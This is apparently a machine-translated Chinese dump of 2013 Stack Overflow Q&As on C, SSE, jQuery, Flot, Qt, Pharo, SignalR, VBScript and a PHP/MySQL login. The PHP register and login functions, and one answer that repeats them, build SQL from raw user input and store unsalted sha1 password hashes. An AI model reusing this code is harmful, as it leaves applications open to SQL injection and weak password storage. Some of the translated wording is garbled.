0x0000000100000f20  6       return 0;
(gdb)
0x0000000100000f24  6       return 0;
(gdb)
Cannot access memory at address 0x0
0x0000000100000f25 in main (argc=1, argv=0x7fff5fbff310) at main.c:6
6       return 0;
(gdb)
Cannot access memory at address 0x0
0x0000000100000ee4 in start ()
(gdb)
Cannot access memory at address 0x0
0x0000000100000ee6 in start ()
(gdb)
0x0000000100000f26 in dyld_stub_exit ()
(gdb)
0x0000000100000f44 in dyld_stub_puts ()
(gdb)
0x0000000100000f49 in dyld_stub_puts ()
(gdb)
0x0000000100000f34 in dyld_stub_puts ()
(gdb)
0x0000000100000f3b in dyld_stub_puts ()
(gdb)
0x0000000100000f3d in dyld_stub_puts ()
(gdb)
0x00007fff83b396a0 in dyld_stub_binder ()
(gdb)
0x00007fff83b396a1 in dyld_stub_binder ()
(gdb)
0x00007fff83b396a4 in dyld_stub_binder ()
(gdb)
0x00007fff83b396ab in dyld_stub_binder ()
(gdb)
0x00007fff83b396af in dyld_stub_binder ()
(gdb)
0x00007fff83b396b4 in dyld_stub_binder ()
(gdb)
0x00007fff83b396b9 in dyld_stub_binder ()
(gdb)
0x00007fff83b396be in dyld_stub_binder ()
(gdb)
0x00007fff83b396c3 in dyld_stub_binder ()
(gdb)
0x00007fff83b396c8 in dyld_stub_binder ()
(gdb) 
```

... ETC。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T22:00:40.963

在玩缓冲区之前总是做边界检查。

```
#define MAX_BUFFER_SIZE 128    
int main(int argc, char *argv[]){

        FILE *inputFile;
        char filename[MAX_BUFFER_SIZE];
        .
        .
        if(strlen(argv[1]) >= MAX_BUFFER_SIZE) // Bound check
        {
            /* Do something appropriate, such as throw an error. */
        }
        else {
        strcpy(filename, argv[1]);
        .
        .
} 
```

[这](http://www.ibm.com/developerworks/library/s-buffer-defend.html)可能对你的面试有帮助。

# android - 如何获取异物的id？

> ID：15510574
> 
> 赞同：0
> 
> 时间：2013-03-19T21:13:56.890
> 
> 标签：android, ormlite

我有一个 List 类，它有很多`ListItem`s。我怎么能在`ListItem`类中编写一个方法来返回它所属的 List 的 id？

除了从数据库中加载 List 并从该对象获取 id 之外，我还没有找到任何其他解决方案。这是愚蠢的，因为数据已经在`ListItem`对象中。我只是不知道如何得到它。

我的`ListItem`课看起来像这样（我没有写所有的 setter 和 getter）。

```
public class ListItem {

  @DatabaseField(columnName = Contract.ListItem._ID, generatedId = true)
  @DefaultSortOrder
  private long id;

  @DatabaseField(foreign = true, columnName = Contract.ListItem.LIST)
  private List list;

  public ListItem() {
  }

  public List getList() {
    return this.list;
  }
} 
```

`Contract.ListItem.LIST`返回`"list_id"`。

# c++ - 检测 QLineEdit 之外的点击

> ID：15510578
> 
> 赞同：0
> 
> 时间：2013-03-19T21:14:08.030
> 
> 标签：c++, qt, qt5, qlineedit

我的复杂 GUI 由许多本机和自定义小部件组成。它们中的大多数根本没有焦点（我不需要它：例如，一些不需要用户输入的仅显示小部件）。

`QLineEdit`当 GUI 希望用户输入一些字符串时，有时会出现在屏幕上（想象一下按 F2 后窗口的资源管理器选择了一些文件（重命名）。

我希望用户能够以`QLineEdit`尽可能多的方式关闭它：按 Enter、ESC、在 QLineEdit 外部单击。

1.  `QLineEdit`在某些情况下发送`editingFinished()`信号（按 Enter，单击另一个小部件）；
2.  我也可以制作派生自该类的新类，该类在发生时`QLineEdit`发送`editingFinished()`信号`focusOutEvent(QFocusEvent *)`。
3.  在该课程中，我可以捕获 ESC 键并发送`editingFinished()`.

唯一的问题是`QLineEdit`只有当另一个小部件获得焦点时才会失去焦点。因此，如果您单击不关心焦点的小部件，则`QLineEdit`保持焦点并且不发送`editingFinished()`信号。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T01:17:40.683

您可能需要为您的整个应用程序安装一个事件过滤器，`lineEdits`当发生鼠标点击时，它会向您发送一个自定义事件。然后在`lineEdit`, 并`QObject::event()`为您的`lineEdit`类实施检查该自定义事件是否处于活动状态或具有焦点。

我写了一个答案，指向过滤器的文档，如下所示：

[捕捉 Qt 修饰键释放](https://stackoverflow.com/questions/10747991/catching-qt-modifier-key-releases/11026014#11026014)

希望有帮助。

# javascript - 不显示 1 个月内的小时 zoom Highstock

> ID：15510579
> 
> 赞同：0
> 
> 时间：2013-03-19T21:14:09.230
> 
> 标签：javascript, highstock

我需要隐藏放大到 1 个月的时间。

我在这里有一个演示：http: [//dev.feldsam.cz/unipetrol-stock/](http://dev.feldsam.cz/unipetrol-stock/)

我尝试使用`tickPositioner`：

```
tickPositioner: function(min, max) {                
    var diff = max - min;

    // month
    if(diff <= 31 * 24 * 3600 * 1000 && diff > 24 * 3600 * 1000) {
        var date = new Date(max);
        var minus = date.getHours() * 3600 * 1000;
        max = max - minus;

        var pos,
        tickPositions = [],
        tickStart = new Date(date.getFullYear(), date.getMonth(), 1).getTime();

        for (pos = tickStart; pos <= max; pos += (5 * 24 * 3600 * 1000)) {
            tickPositions.push(pos);
        }

        tickPositions.info = {
            unitName: "day",
            higherRanks: {} 
        };

        this.options.ordinal = false;

        return tickPositions;
    } else {
        this.options.ordinal = true;
    }
} 
```

但时间仍在显示。另外，当我从一个月点击到另一个月时，序数仍然是错误的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T14:45:01.817

您可以在 dateTimeLabelFormat [http://api.highcharts.com/highstock#xAxis.dateTimeLabelFormats中定义它](http://api.highcharts.com/highstock#xAxis.dateTimeLabelFormats)

# javascript - 浮动时间序列日期标签不正确

> ID：15510582
> 
> 赞同：1
> 
> 时间：2013-03-19T21:14:18.550
> 
> 标签：javascript, flot

我正在尝试使用 Flot 创建时间序列图来比较两个数据系列。包含 jQuery、jquery.flot.js 和 jquery.flot.time.js 后，我的代码如下所示：

```
$(function () {
  var d1 = {
    label: "Fall 2011",
    data: [
      [1296536400, 9],
      [1296622800, 23],
      [1296709200, 30],
      [1296795600, 64],
      [1296882000, 94],
      [1296968400, 113],
      [1297054800, 125],
      [1297141200, 156],
      [1297227600, 181],
      [1297314000, 200],
      [1297400400, 217],
      [1297486800, 231],
      [1297573200, 248],
      [1297659600, 259],
      [1297746000, 271],
      [1297832400, 282],
      [1297918800, 308],
      [1298005200, 316],
      [1298091600, 332],
      [1298178000, 345],
      [1298264400, 360],
      [1298350800, 373],
      [1298437200, 391],
      [1298523600, 409],
      [1298610000, 427],
      [1298696400, 433],
      [1298782800, 444],
      [1298869200, 460],
      [1298955600, 467],
      [1299042000, 479],
      [1299128400, 494],
      [1299214800, 500],
      [1299301200, 509],
      [1299387600, 530],
      [1299474000, 548],
      [1299560400, 567],
      [1299646800, 577],
      [1299733200, 596],
      [1299819600, 608],
      [1299906000, 623],
      [1299992400, 638],
      [1300075200, 651],
      [1300161600, 670],
      [1300248000, 689],
      [1300334400, 712],
      [1300420800, 722],
      [1300507200, 737],
      [1300593600, 764],
      [1300680000, 784],
      [1300766400, 807],
      [1300852800, 839],
      [1300939200, 865],
      [1301025600, 880],
      [1301112000, 901],
      [1301198400, 937],
      [1301284800, 970],
      [1301371200, 1000],
      [1301457600, 1030],
      [1301544000, 1064],
      [1301630400, 1081],
      [1301716800, 1111],
      [1301803200, 1144],
      [1301889600, 1176],
      [1301976000, 1207],
      [1302062400, 1232],
      [1302148800, 1251],
      [1302235200, 1270],
      [1302321600, 1293],
      [1302408000, 1329],
      [1302494400, 1361],
      [1302580800, 1398],
      [1302667200, 1442],
      [1302753600, 1474],
      [1302840000, 1499],
      [1302926400, 1524],
      [1303012800, 1553],
      [1303099200, 1585],
      [1303185600, 1619],
      [1303272000, 1658],
      [1303358400, 1703],
      [1303444800, 1754],
      [1303531200, 1784],
      [1303617600, 1830],
      [1303704000, 1896],
      [1303790400, 1968],
      [1303876800, 2045],
      [1303963200, 2140],
      [1304049600, 2230],
      [1304136000, 2337],
      [1304222400, 2457],
      [1304308800, 2532],
      [1304395200, 2587],
      [1304481600, 2618],
      [1304568000, 2641],
      [1304654400, 2658],
      [1304740800, 2675],
      [1304827200, 2690],
      [1304913600, 2703],
      [1305000000, 2719],
      [1305086400, 2735],
      [1305172800, 2746],
      [1305259200, 2757],
      [1305432000, 2761],
      [1305518400, 2778],
      [1305604800, 2794],
      [1305691200, 2800],
      [1305777600, 2804],
      [1305864000, 2813],
      [1305950400, 2821],
      [1306036800, 2822],
      [1306123200, 2833],
      [1306209600, 2843],
      [1306296000, 2854],
      [1306382400, 2860],
      [1306468800, 2871],
      [1306555200, 2875],
      [1306728000, 2879],
      [1306814400, 2883],
      [1306900800, 2886],
      [1306987200, 2891],
      [1307073600, 2894],
      [1307160000, 2897],
      [1307246400, 2898],
      [1307332800, 2903],
      [1307419200, 2907],
      [1307505600, 2913],
      [1307592000, 2914],
      [1307678400, 2919],
      [1307764800, 2920],
      [1307851200, 2923],
      [1308024000, 2929],
      [1308110400, 2935],
      [1308196800, 2936],
      [1308283200, 2937],
      [1308369600, 2940],
      [1308456000, 2941],
      [1308542400, 2946],
      [1308628800, 2949],
      [1308715200, 2957],
      [1308801600, 2958],
      [1308888000, 2962],
      [1308974400, 2963],
      [1309060800, 2965],
      [1309147200, 2969],
      [1309233600, 2970],
      [1309320000, 2974],
      [1309406400, 2975],
      [1309492800, 2976],
      [1309924800, 2978],
      [1310702400, 2979],
      [1310875200, 2980],
      [1310961600, 2981],
      [1311134400, 2982],
      [1311566400, 2983],
      [1311652800, 2984]
    ]
  };
  $.plot("#placeholder", [d1], {
    xaxis: {
      mode: "time",
      timeformat: "%m/%d %h:%m"
    },
    legend: {
      show: true,
      position: 'se'
    }
  });
}); 
```

这会生成图表： ![图形](../Images/657089435dec43523d6cffb7ef25cd64.png)

请注意 x 轴标签不正确。unix 时间戳的范围从 2011 年 2 月 1 日到 2011 年 7 月 26 日。我尝试了各种“timeformat”和“minTickSize”选项，但无济于事。我究竟做错了什么？如何让标签显示整个数据范围的月份和日期名称？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:32:36.607

您希望将 UNIX 时间戳乘以 1000，以便将它们转换为适合 Javascript 的格式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:49:49.387

这应该给你一个开始 - [http://jsfiddle.net/TZWbN/](http://jsfiddle.net/TZWbN/)

```
 data: [

         [1308888000000, 2962],
      [1308974400000, 2963],
      [1309060800000, 2965],
      [1309147200000, 2969],
      [1309233600000, 2970],
      [1309320000000, 2974],
      [1309406400000, 2975],
      [1309492800000, 2976],
      [1309924800000, 2978],
      [1310702400000, 2979],
      [1310875200000, 2980],
      [1310961600000, 2981],
      [1311134400000, 2982],
      [1311566400000, 2983],
      [1311652800000, 2984]]
  }; 
```

# jquery - 如何在 jQuery 中获取会话中的值

> ID：15510590
> 
> 赞同：1
> 
> 时间：2013-03-19T21:14:49.207
> 
> 标签：jquery, html, jquery-session

我是 jQuery 的初学者。
我想在 HTML 页面中设置值，我必须在另一个 HTML 页面中获取它们。

这是我现在正在尝试的一段代码：

在会话中设置值：

```
$.session.set(userName, $("#uname").val()); 
```

从会话中获取值：

```
$.session.get('userName'); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-19T21:23:50.057

假设您正在使用[这个插件](https://github.com/AlexChittock/JQuery-Session-Plugin)，那么您正在滥用该`.set`方法。`.set`必须将键的名称作为字符串以及值传递。我想你的意思是写：

```
$.session.set("userName", $("#uname").val()); 
```

这`userName`会将会话存储中的键设置为输入的值，并允许您使用以下方法检索它：

```
$.session.get('userName'); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T21:18:11.337

会话存储在服务器上，并且是从服务器端代码设置的，而不是 JavaScript 等客户端代码。

你想要的是一个 cookie，有人在这个 Stack Overflow 问题中给出了精彩的解释： [如何使用 jQuery 设置/取消设置 cookie？](https://stackoverflow.com/questions/1458724/how-to-set-unset-cookie-with-jquery)

您可能会使用会话并使用 jQuery 和 AJAX 设置/检索它们，但如果 Cookies 能做到这一点，那就太矫枉过正了。

# c# - 基于服务的数据库连接字符串

> ID：15510592
> 
> 赞同：5
> 
> 时间：2013-03-19T21:14:57.597
> 
> 标签：c#, sql-server, entity-framework, sql-server-2008-r2, connection-string

我正在使用基于服务的数据库，因此 db 文件与程序一起存储。当最终用户可以轻松地将带有数据库的应用程序移动到另一台计算机时，它使最终用户更容易。

这是我的连接字符串：

> 添加 name="DBEnitity"
> connectionString="metadata=res:// */Model.csdl|res://* /Model.ssdl|res://*/Model.msl;provider=System.Data.SqlClient;provider 连接字符串="数据源=SQLEXPRESS2008;attachdbfilename=|DataDirectory|\db.mdf;集成安全=True;用户实例=True;multipleactiveresultsets=True;App=EntityFramework"" providerName="System.Data.EntityClient" />

但如果我在安装了 SQL Server Express 2012 的机器上对其进行测试，它将无法连接。这是为什么？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:28:00.137

您应该使用`data source=.`连接到 sql server 的默认实例，或`data source=.\SQLSERVERNAME`用于 sql server 命名实例

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-27T17:32:41.800

你应该使用：

```
data source=. 
```

其中`.`表示本地 SQL 服务器。

# pharo - Pharo 2.0 有成熟的 OpenGL 库吗？

> ID：15510596
> 
> 赞同：1
> 
> 时间：2013-03-19T21:15:25.467
> 
> 标签：pharo

[http://book.pharo-project.org/book/LanguageAndLibraries/3DGraphicsAndOpenGL/](http://book.pharo-project.org/book/LanguageAndLibraries/3DGraphicsAndOpenGL/)中的答案太过时了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T07:37:22.427

对于 Pharo 2.0 和 OpenGL，有一个名为 NBOpenGL 的绑定包。

在这里查看：

[http://smalltalkhub.com/#!/~PharoExtras/NBOpenGL](http://smalltalkhub.com/#!/~PharoExtras/NBOpenGL)

你可以安装它：

```
Gofer it
    smalltalkhubUser: 'PharoExtras' project: 'NBOpenGL';
    configuration;
    load.
(ConfigurationOfNBOpenGL project version: '2.0') load. 
```

在我的 Mac 中，它开箱即用，但缺少一些文档。我找到了一个例子：

```
GLTTRenderingDemo new openInWorld. 
```

好吧，因为它只是一个 OpenGL 绑定，所以图形程序员应该对它感到满意 :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:37:12.300

你应该去[雅典](http://code.google.com/p/pharo/wiki/Athens)看看。这是[演示](http://www.pharocasts.com/2012/06/athens-and-native-boost-at-work.html)

# c - 总字节数的 SSE 代码。错误在哪里？

> ID：15510597
> 
> 赞同：5
> 
> 时间：2013-03-19T21:15:39.050
> 
> 标签：c, algorithm, visual-studio-2005, sse

我编写了 SSE 代码来总结字节值。（VS2005。）

因为它很简单，所以效果很好（而且速度很快）。只有某些大小的数组会发生崩溃。它只在发布模式下崩溃 - 在调试中永远不会。也许有人看到了“明显”的错误？任何帮助表示赞赏。

```
__int64 Sum (const unsigned char* pData, const unsigned int& nLength)
{
    __int64 nSum (0);

    __m128i* pp = (__m128i*)pData;

    ATLASSERT( ( (DWORD)pp & 15 ) == 0 ); // pointer must point to address multiple of 16 (cache line)

    __m128i zero = _mm_setzero_si128(),
        a, b, c, d, tmp;

    unsigned int i (0);

    for ( ; i < nLength; i+=64) // 4-fach loop-unroll (x 16)
    {
        a = _mm_sad_epu8( *(pp++), zero);           
        b = _mm_sad_epu8( *(pp++), zero);  // It crashes here.
        c = _mm_sad_epu8( *(pp++), zero);
        d = _mm_sad_epu8( *(pp++), zero);

        // commenting the following line prevents the crash (???)
        tmp = _mm_add_epi64( _mm_add_epi64( _mm_add_epi64( a, b ), c ), d);

        a = _mm_srli_si128 ( tmp, 8 );

        nSum += _mm_cvtsi128_si32( a ) + _mm_cvtsi128_si32( tmp );
    }

    // ... the rest
    if (nLength % 64)
        for (i -= 64; i < nLength; i++)
            nSum += pData [i];

    return nSum;
} 
```

该函数是这样调用的：

```
unsigned int nLength = 3571653;  // One of the values that causes crash
unsigned char *pData = (unsigned char*) _aligned_malloc(nLength, 16);
Sum (pData,  nLength); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:31:59.070

您的 for 循环需要定义如下：

```
for ( ; i < (nLength - 63); i+=64) 
```

基本上想象你传入一个 nLength 120 的数组。你在第一次运行时很好。i 现在等于 64。 i < 120 所以你做另一个循环。不幸的是，您在到达 128 之前通过了数组的末尾，并且您进入了未定义的行为领域。这可能表现为访问冲突 (0xC0000005)，会导致您崩溃。

现在以 nLength=128 为例，通过我建议的修改，它应该可以在您的优化循环中完美运行。第一个循环 i 很好，并且 i = 64。i 小于 65，因此执行另一个循环。i 现在等于 128 并且循环退出。外部循环也不会运行，因为 i == nLength。任务完成 ：）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T10:02:33.967

根据要求，当我说“循环中有 4 个累加器并在循环后对它们求和”时，这就是我的想法。

```
__int64 Sum (const unsigned char* pData, const int& nLength)
{
    __int64 nSum (0);

    __m128i* pp = (__m128i*)pData;

    __m128i zero = _mm_setzero_si128(),
        a = _mm_setzero_si128(),
        b = _mm_setzero_si128(),
        c = _mm_setzero_si128(),
        d = _mm_setzero_si128(), tmp;

    int i (0);

    for ( ; i < (nLength - 63); i+=64)
    {
        a = _mm_add_epi64( _mm_sad_epu8( *(pp++), zero ), a );
        b = _mm_add_epi64( _mm_sad_epu8( *(pp++), zero ), b );
        c = _mm_add_epi64( _mm_sad_epu8( *(pp++), zero ), c );
        d = _mm_add_epi64( _mm_sad_epu8( *(pp++), zero ), d );
    }

    tmp = _mm_add_epi64( _mm_add_epi64( a, b ), _mm_add_epi64( c, d ));
    tmp = _mm_add_epi64( _mm_srli_si128( tmp, 8 ), tmp );
    nSum = (_mm_cvtsi128_si32( tmp ) & 0xFFFFFFFFULL) + 
               (((__int64)_mm_cvtsi128_si32( _mm_srli_si128( tmp, 4 ) )) << 32);

    // ... the rest
    for (; i < nLength; i++)
        nSum += pData [i];

    return nSum;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-13T07:51:07.060

我自己只是在研究这种东西，我发现[哈罗德的回答](https://stackoverflow.com/a/15520419/934383)对我现在正在做的类似事情很有帮助。但是，我想提出的另一个建议是，如果对您的应用程序来说不是太麻烦，您是否考虑过在最后用零填充数据，这样您就不需要在最后执行这些额外的工作你的功能？

# jquery - 带有切换类的 Onclick 功能不起作用

> ID：15510600
> 
> 赞同：0
> 
> 时间：2013-03-19T21:15:48.380
> 
> 标签：jquery

我有一些`<article>`带有类的标签，还有两个按钮根据它们的类显示和隐藏某些文章 - 但它不起作用

有**两个按钮**：`.latestClick`和`.mostViewedClick`。每个都应该显示自己相应的`<article>`标签：`<article>`带有类的标签`.latest`应该在单击`.latestClick`按钮时显示，按钮也是如此`.mostViewedClick`。有些`<article>`标签有机器人类，所以当点击两个按钮中的任何一个时，它应该会显示出来。

jQuery

```
$('#featuredToggle ul li a').click(function (e) {
    e.preventDefault();

    if ($(this).hasClass('latestClick')) {
        $('article .mostViewed').toggleClass('hideArticle');
        $('article .latest').toggleClass('showArticle');
    } else if ($(this).hasClass('mostViewedClick')) {
        $('article .latest').toggleClass('hideArticle');
        $('article .mostViewed').toggleClass('showArticle');
    }
}); 
```

HTML：

```
<div id="featuredToggle">
    <ul>
        <li><a class="latestClick" href="#">Latest</a>
        </li>
        <li><a class="mostViewedClick" href="#">Most Viewed</a>
        </li>
    </ul>
</div>
<div class="box_mini block feed">
    <article class="latest"> <a href="post.html"><img src="img/175x175.jpg" alt="" /></a>

        <div class="content">
             <h4><a href="post.html">SUV's</a></h4>

        </div>
    </article>
    <article class="mostViewed hideArticle"> <a href="post.html"><img src="img/175x175.jpg" alt="" /></a>

        <div class="content">
             <h4><a href="post.html">Bakkies</a></h4>

        </div>
    </article>
    <article class="latest mostViewed"> <a href="post.html"><img src="img/175x175.jpg" alt="" /></a>

        <div class="content">
             <h4><a href="post.html">Hatch Back</a></h4>

        </div>
    </article>
    <article class="latest mostViewed"> <a href="post.html"><img src="img/175x175.jpg" alt="" /></a>

        <div class="content">
             <h4><a href="post.html">Sedan</a></h4>

        </div>
    </article>
    <article class="latest"> <a href="post.html"><img src="img/175x175.jpg" alt="" /></a>

        <div class="content">
             <h4><a href="post.html">Coupe</a></h4>

        </div>
    </article>
</div> 
```

CSS：

```
.hideArticle {
    display: none;
}
.showArticle {
    display: block;
} 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:18:19.887

```
$('article .mostViewed').toggleClass('hideArticle');
$('article .latest').toggleClass('showArticle'); 
```

您的选择器中有一个不属于您的空间。

```
$('article.mostViewed').toggleClass('hideArticle');
$('article.latest').toggleClass('showArticle'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:26:53.590

`$('article .mostViewed')`正在寻找一个带有子元素的文章标签，该子元素具有 class `mostViewed`。您需要删除空格以表明您正在寻找具有类的文章标签`mostViewed`。

除此之外，使用切换可能会产生不良影响，特别是当有人不断点击同一个链接时。

您可以使用 jQuery [**show()**](http://api.jquery.com/show/) / [**hide()**](http://api.jquery.com/hide/)大大简化您的代码，类似于：

```
$('#featuredToggle ul li a').click(function (e) {
    e.preventDefault();

    if ($(this).hasClass('latestClick')) {
        $('article.mostViewed').hide();
        $('article.latest').show();
    } else if ($(this).hasClass('mostViewedClick')) {
        $('article.latest').hide();
        $('article.mostViewed').show();
    }
}); 
```

这样，您也不会通过重复单击同一链接而获得不希望的结果。

* * *

[**演示**](http://jsfiddle.net/5zavr/)- 使用`show()`和`hide()`

* * *

# animation - 使用多个 png 的 Sprite 动画

> ID：15510606
> 
> 赞同：0
> 
> 时间：2013-03-19T21:16:15.383
> 
> 标签：animation, svg, cross-platform, sprite, spritely

我一直在尝试做一些跨平台动画，因此没有 web-kit 框架或画布等，也没有 svg（Android 问题）

我有 7 个 png，我想通过它们制作动画（不使用一堆 setTimeOuts），这对我来说听起来是一个非常简单的问题，但经过一番谷歌搜索后我找不到解决方案。

我看过的东西包括 sprite.js、spritely 等，但我真的不想将我所有的 7 帧组合成一个精灵

是否有一个精简的动画库可以让我轻松地跨平台为思想 7 个单独的 png 设置动画？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T11:55:41.407

maybe not the best way, but i have AnimationTime variable that I increment on every loop. and when that varialbe reach some number then i increase frame of image and reset AnimationTime back to 0.

pseudo code

```
AnimationDuraion = 10;
do
AnimationTime += 1;
if (AnimationTime == AnimationDuration){AnimationTime = 0; SpriteFrame +=1;}
if (SpriteFrame > MaxSpriteFrames) {SpriteFrame = 0}
loop 
```

and depend on SpriteFrame show that frame changing "background-position" as Duopixel suggested.

# php - 简单的 PHP/MySQL 用户注册有效，但无法使用用户名登录

> ID：15510607
> 
> 赞同：1
> 
> 时间：2013-03-19T21:16:24.987
> 
> 标签：php, mysql

我正在开发一个简单的用户登录系统，以便在我自己的机器上练习。

我有一个带有用户名、密码和电子邮件的 mysql 表用户。我能够使用以下内容注册新用户：

```
//short variable names:

$email = $_POST['email'];
$username = $_POST['username'];
$password = $_POST['password'];
$password2 = $_POST['password2'];

session_start();

//attempt to register
register($username, $email, $password); 
```

我创建了这个函数来输入 db 它使用以下函数工作：

```
 function register($username, $email, $password){
//register new person with db
//return true or error

//connect to db
$db = db_connect();

//check if username is unique
$result = $db->query("SELECT * from user where username = '".$username."'");
if(!$result){
    throw new Exception('Could not execute query');
}

if($result->num_rows>0){
    throw new Exception('That username is taken - go back and choose another one.');
}

//if ok, put in db
$result = $db->query("INSERT into user values
        ('".$username."', sha1('".$password."'), '".$email."')");

if(!$result){
    throw new Exception('Could not register you in database - Please try again later.');
}

return true; 
```

}

然后我注册了变量

```
//register session variable
$_SESSION['valid_user'] = $username;

echo 'Your registration was successful. Go to the members page to start setting up your profile!'; 
```

当我尝试使用用户名和密码登录时，它不起作用这里是登录代码：

```
function login($username, $password){
//check username and password with db
$db = db_connect();

//check if username unique
$result = $db->query("SELECT * FROM user where username = '".$username."' and password = sha1('".$password."')");
if(!$result){
    throw new Exception('Could not log you in.');
}
if($result->num_rows > 0){
    return true;
} else {
    throw new Exception('Could not log you in.');
}
} 
```

我知道这不安全，只是在我的机器上练习，所以我可以向上移动，有人有什么解释吗？密码在数据库中注册为 sha1 varchar，我认为这就是我没有这样做的地方吗？

谢谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:25:25.553

问题很可能出在密码的**VARCHAR**定义中。**sha1**的长度为 160 位。

无论如何，我不建议在**VARCHAR**字段中存储密码，而是使用**BINARY(20)**和**UNHEX**函数将**SHA1**值转换为二进制。

数据库中有很多记录（数千，数百万）二进制（20）比varchar或char占用更少的内存。

**或**将其更改为**CHAR(40)**

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-19T21:32:57.647

尝试

```
function login($username, $password){
//check username and password with db
$db = db_connect();

//check if username unique
$result = $db->query("SELECT * FROM user where username = '".$username."' and password = sha1('".$password."')");
if(!$result){
    throw new Exception('Could not log you in.');
}
if(mysql_num_rows($result) > 0){
    return true;
} else {
    throw new Exception('Could not log you in.');
}
} 
```

我更改了您的条件检查 num 行。

# asp.net - Asp.Net Signal R - 检测数据库中的变化？Asp.net 网络表单

> ID：15510610
> 
> 赞同：2
> 
> 时间：2013-03-19T21:16:43.743
> 
> 标签：asp.net, queue, signalr, long-polling, polling

所以我在更新面板中有一个列表视图

```
Update Panel
    List View
        Email 1
        Email 2
        Email 3
           ... 
```

我正在尝试在 ASP.NET 中做一个类似于 GMAIL 的收件箱，我唯一苦苦挣扎的是如何检测数据库更改（即发送新消息时）并将该消息推送到 ListView 以模拟用户收到一条新消息（就像 gmail 一样）

如何使用 SignalR 检测数据库更改并使用 SignalR 将它们推送到列表视图中？可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:38:47.867

如果您使用的是 Sql Server，请点击此链接。[http://techbrij.com/database-change-notifications-asp-net-signalr-sqldependency](http://techbrij.com/database-change-notifications-asp-net-signalr-sqldependency)

它基本上使用[SqlDependency](http://msdn.microsoft.com/tr-tr/library/system.data.sqlclient.sqldependency.aspx)来订阅 Sql Server 中的更改。

如果您不使用 Sql Server，则必须手动执行此操作。对于视图方面，您可以使用 KnockoutJS 或 angular 来轻松修改列表。

```
//Set up dependency
protected void Application_Start()
{
        //...
   SqlDependency.Start(ConfigurationManager.ConnectionStrings["DefaultConnection"].ConnectionString); 
}

protected void Application_End()
{
    SqlDependency.Stop(ConfigurationManager.ConnectionStrings["DefaultConnection"].ConnectionString); 
}

SqlDependency dependency = new SqlDependency(command);
dependency.OnChange += new OnChangeEventHandler(dependency_OnChange); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:39:59.057

我认为您不能使用 SignalR 来检测数据库中的更改，而是将更改推送到网站。使用[SqlDependency](http://msdn.microsoft.com/en-us/library/9dz445ks%28v=vs.80%29.aspx)或 SQL Notification Services 之类的东西来检测数据库中的更改，然后 SignalR 将它们推送到网页。

# vbscript - 使用 vbscript 并将 ADO 记录集设置为变量

> ID：15510615
> 
> 赞同：1
> 
> 时间：2013-03-19T21:16:52.180
> 
> 标签：vbscript, adodb

我有很多 PDF 文件，我试图根据 Excel 电子表格中的标准重命名。电子表格列出了 ID、姓氏、名字。

```
| 123456 | Smith | Joe | 
```

我可以很好地打开和读取 excel，可以创建 ado 连接并获得对我的查询的响应，但找不到一种方法来获取包含文件名的记录集的一部分并保存为变量。

我正在使用的代码：（更新到当前代码集）

```
'On Error Resume Next

LetterDirectory = InputBox("What letter are we scanning?")

DirectoryLocation = "C:\CLNotes\"
LetterDirectory = UCase(LetterDirectory)
SubDirectory = DirectoryLocation & LetterDirectory
FullDirectory = DirectoryLocation & LetterDirectory & "\*.pdf"

'Creating Excel objects
Set xl = CreateObject("Excel.Application")
Set xlBook = xl.Workbooks.Open("c:\CLnotes\dbo_Patient.xlsx")
Set xlSheet = xlBook.Worksheets(LetterDirectory)
xl.Visible = True

'Set Variables
xlRow = 1
totalRows = xl.WorksheetFunction.CountA(xlSheet.Range("A:A"))
oldFilename = 0

For xlRow = 1 to totalRows

LastName = xlSheet.Cells.Item(xlRow, 2).text
FirstName = xlSheet.Cells.Item(xlRow, 3).text
FullName = LastName & " " & Firstname
newFilename = xlSheet.Cells.Item(xlRow, 1).Text
'FullName = "b lorraine"

Set objConnection = CreateObject("ADODB.Connection")
Set objRecordSet = CreateObject("ADODB.Recordset")
objConnection.Open ("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")
objRecordSet.Open ("SELECT System.FileName FROM SYSTEMINDEX WHERE Contains('" & FullName & "')"), objConnection
objRecordSet.MoveFirst
oldFilename = objRecordset.Fields.Item("System.FileName")
Do Until objRecordset.EOF
    Wscript.Echo objRecordset.Fields.Item("System.FileName")
    objRecordset.MoveNext
Loop
Next 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:36:33.143

IF

```
Wscript.Echo objRecordset.Fields.Item("System.FileName") 
```

outputs 'the part of the recordset that contains the filename' (you are interested in) AND

```
Set oldFilename = objRecordset.Fields.Item("System.FileName") 
```

was your attempt to 'save [that value] as a variable' THEN

```
oldFilename = objRecordset.Fields.Item("System.FileName") 
```

will solve your problem, because `Set` is to be used for assignment of objects only (not 'plain' data types like strings).

That `Set var = non-object` is the cause of your trouble - as I assume - is hidden by your use of the EVIL global `On Error Resume Next`.

# visual-studio-2010 - 在 Visual Studio 2010 中使用 SystemC

> ID：15510620
> 
> 赞同：1
> 
> 时间：2013-03-19T21:17:14.373
> 
> 标签：visual-studio-2010, systemc

